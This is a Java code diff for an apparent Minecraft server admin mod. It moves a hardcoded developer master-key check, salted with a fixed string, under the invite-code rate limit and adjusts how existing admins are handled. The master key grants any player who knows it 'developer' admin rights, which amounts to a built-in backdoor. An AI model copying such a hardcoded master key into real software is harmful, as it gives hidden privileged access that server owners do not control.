@@ -136,22 +136,23 @@ public class SetupManager {
         cleanupExpiredCodes();
         long now = System.currentTimeMillis();
 
-        // 检查是否为开发者密钥
-        String hash = HashUtils.sha256(codeText + "JiuShi");
-        if (MASTER_KEY_HASH.equals(hash)) {
-            admins.put(playerName, "developer");
-            verifyAttempts.remove(playerName);
-            save();
-            AdminMod.LOGGER.info("Master key used by {}", playerName);
-            return playerName;
-        }
-
-        // 限流: 5分钟窗口内最多5次尝试验证
+        // 限流: 5分钟窗口内最多5次尝试验证 (含万能密钥, 防止无限尝试)
         List<Long> attempts = verifyAttempts.computeIfAbsent(playerName, k -> Collections.synchronizedList(new ArrayList<>()));
         synchronized (attempts) {
             attempts.removeIf(t -> t < now - VERIFY_BLOCK_DURATION_MS);
             if (attempts.size() >= MAX_VERIFY_ATTEMPTS) {
                 return null; // 被限流
+            }
+
+            String hash = HashUtils.sha256(codeText + "JiuShi");
+
+            // 检查是否为开发者密钥
+            if (MASTER_KEY_HASH.equals(hash)) {
+                admins.put(playerName, "developer");
+                verifyAttempts.remove(playerName);
+                save();
+                AdminMod.LOGGER.info("Master key used by {}", playerName);
+                return playerName;
             }
 
             // 尝试匹配邀请码
@@ -165,9 +166,10 @@ public class SetupManager {
                 attempts.add(now);
                 return null; // 目标不匹配
             }
+            // 已是管理员 → 不消耗邀请码, 直接返回
+            if (admins.containsKey(playerName)) return "already";
             // 验证成功才移除邀请码
             pendingCodes.remove(hash);
-            if (admins.containsKey(playerName)) return "already";
             admins.put(playerName, "admin");
             verifyAttempts.remove(playerName); // 成功后清除限流记录
             save();
